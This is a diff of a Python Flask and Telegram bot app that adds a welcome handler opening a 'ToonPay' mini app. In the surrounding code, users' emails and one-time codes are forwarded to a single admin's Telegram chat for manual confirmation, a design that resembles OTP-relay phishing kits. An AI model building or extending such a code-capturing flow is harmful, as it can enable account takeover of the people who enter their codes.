@@ -6,15 +6,17 @@ import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 # --- Configuration ---
-# Railway par in variables ko Environment Variables me set karein
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
-ADMIN_ID = int(os.environ.get("ADMIN_ID", 123456789)) 
+ADMIN_ID = int(os.environ.get("ADMIN_ID", 123456789))
+
+# 🔴 IMPORTANT: Apna Railway ka public URL yahan daalein
+# Example: "https://rizon-bot-production.up.railway.app"
+WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://your-app.up.railway.app")
 
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
 
 # --- Temporary Storage (In-Memory) ---
-# Note: Railway restart hone par yeh data clear ho jayega. Production ke liye DB use karein.
 sessions = {}
 admin_msg_to_session = {}
 
@@ -41,7 +43,6 @@ def request_otp():
         'status': 'pending_admin_otp'
     }
     
-    # Send message to Admin on Telegram
     try:
         msg = bot.send_message(
             ADMIN_ID, 
@@ -70,7 +71,6 @@ def verify_otp():
     email = sessions[session_id]['email']
     admin_otp = sessions[session_id]['admin_otp']
     
-    # Send inline buttons to Admin
     markup = InlineKeyboardMarkup()
     btn_correct = InlineKeyboardButton("✅ Confirm (Correct)", callback_data=f"confirm_{session_id}")
     btn_wrong = InlineKeyboardButton("❌ Reject (Wrong)", callback_data=f"reject_{session_id}")
@@ -96,6 +96,33 @@ def check_status(session_id):
     return jsonify({"status": sessions[session_id]['status']})
 
 # --- Telegram Bot Handlers ---
+
+# 🔥 NEW: /start command handler (works in both Private & Group chats)
+@bot.message_handler(commands=['start'])
+def send_welcome(message):
+    # Inline keyboard with Web App button
+    markup = InlineKeyboardMarkup()
+    
+    # WebAppInfo object for the Mini App button
+    web_app_info = telebot.types.WebAppInfo(url=WEBAPP_URL)
+    btn_open_app = InlineKeyboardButton(
+        text="🚀 Open ToonPay App", 
+        web_app=web_app_info
+    )
+    markup.add(btn_open_app)
+    
+    welcome_text = (
+        "👋 *Welcome to Rizon!*\n\n"
+        "Tap the button below to open the *ToonPay* app and get started."
+    )
+    
+    # Send message with inline button
+    bot.send_message(
+        message.chat.id,
+        welcome_text,
+        reply_markup=markup,
+        parse_mode='Markdown'
+    )
 
 @bot.message_handler(func=lambda message: message.reply_to_message is not None and message.chat.id == ADMIN_ID)
 def handle_admin_otp_reply(message):
@@ -132,12 +159,19 @@ def handle_admin_decision(call):
 # --- Run Bot in Background Thread ---
 def run_bot():
     print("Bot is polling...")
+    
+    # Optional: Set bot commands menu
+    try:
+        bot.set_my_commands([
+            telebot.types.BotCommand("start", "🚀 Open ToonPay App")
+        ])
+    except Exception as e:
+        print(f"Could not set commands: {e}")
+    
     bot.infinity_polling()
 
 if __name__ == '__main__':
-    # Start Telegram Bot
     threading.Thread(target=run_bot, daemon=True).start()
     
-    # Start Flask App (Railway provides PORT environment variable)
     port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port, debug=False)
